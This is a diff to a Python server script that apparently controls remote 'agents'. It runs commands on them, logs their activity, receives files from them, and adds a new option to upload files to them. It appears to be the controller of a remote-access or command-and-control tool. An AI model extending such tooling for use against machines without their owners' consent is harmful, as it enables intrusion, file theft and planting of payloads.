@@ -4,7 +4,7 @@ from datetime import datetime
 
 
 def receive_file(client_socket, file_path):
-    save_directory = r"C:\Users\Student\Desktop"  # Specify the directory where you want to save the file
+    save_directory = r"C:\Users\User\OneDrive\Desktop"  # Specify the directory where you want to save the file
     os.makedirs(save_directory, exist_ok=True)  # Create the directory if it doesn't exist
 
     try:
@@ -19,16 +19,57 @@ def receive_file(client_socket, file_path):
                     break
                 print(f"Received data length: {len(data)}")
                 file.write(data)
+
         print(f"File saved successfully at: {abs_file_path}")
+
+        # Sending acknowledgment back to the client
+        client_socket.send("File received successfully".encode('utf-8'))
+
+        # Ensure the file is closed before returning
+        file.close()
 
         with open(abs_file_path, "rb") as file:
             file_content = file.read()
             print(f"Content of saved file length: {len(file_content)}")
 
+        # Add a return statement to break out of the file processing loop
+        return True
+
     except OSError as e:
         print(f"OS Error ({e.errno}): {e.strerror}")
     except Exception as e:
         print(f"Error while receiving file: {e}")
+
+    # Return False if there was an issue with file processing
+    return False
+
+
+def send_file(client_socket, file_path):
+    try:
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+
+        client_socket.send(file_data)
+        print(f"File sent successfully: {file_path}")
+
+        acknowledgment = client_socket.recv(4096).decode('utf-8')
+        print(acknowledgment)
+
+        if acknowledgment == "File received successfully":
+            client_socket.send("next_menu".encode('utf-8'))
+            return True
+        else:
+            print("Error receiving file acknowledgment.")
+            return False
+
+    except FileNotFoundError:
+        print(f"File not found: {file_path}")
+        client_socket.send(f"File not found: {file_path}".encode('utf-8'))
+        return False
+
+    except Exception as e:
+        print(f"Error sending file: {e}")
+        return False
 
 
 def track_agent_activity(agent_id, activity):
@@ -97,7 +138,10 @@ def main():
                 print(output)
                 track_agent_activity(agent_id, f"Executed command: {command}")
         elif choice == '3':
-            print("Not ready !!!")
+            file_path = input("Enter the full path of the file to upload: ").replace('"', '')
+            client_socket.send(f"send {file_path}".encode('utf-8'))
+            send_file(client_socket, file_path)
+            track_agent_activity(agent_id, f"Uploaded file: {file_path}")
         elif choice == '4':
             view_online_agents()
         elif choice == '5':
@@ -110,7 +154,6 @@ def main():
 
     client_socket.close()
     server.close()
-
 
 if __name__ == "__main__":
     main()
